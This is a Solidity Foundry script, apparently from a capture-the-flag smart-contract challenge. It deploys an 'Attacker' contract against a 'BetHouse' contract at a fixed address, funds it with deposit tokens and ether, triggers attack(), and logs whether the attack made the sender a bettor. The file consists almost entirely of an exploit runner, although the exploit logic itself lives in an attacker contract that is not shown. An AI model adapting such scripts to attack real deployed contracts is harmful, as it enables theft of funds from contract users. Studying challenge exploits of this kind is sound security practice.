// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Attacker} from "src/Attacker.sol";
import {IBetHouse} from "src/IBetHouse.sol";
import {IPool} from "src/IPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract CounterScript is Script {

    IBetHouse targetInst;
    IPool targetPool;
    IERC20 depositToken;

    function setUp() public {
        targetInst = IBetHouse(0xD14dD500A97864476039CB441D8af3d600E57a62);
        targetPool = IPool(targetInst.pool());
        depositToken = IERC20(targetPool.depositToken());
    }

    function run() public {
        vm.startBroadcast();

        Attacker attacker = new Attacker(targetInst);
        bool transferSuccess = depositToken.transfer(address(attacker), 5);

        require(transferSuccess, "deposit token transfer failed");

        attacker.attack{ value: 0.001 ether}();

        console.log("Attack success:", targetInst.isBettor(msg.sender));

        vm.stopBroadcast();
    }
}
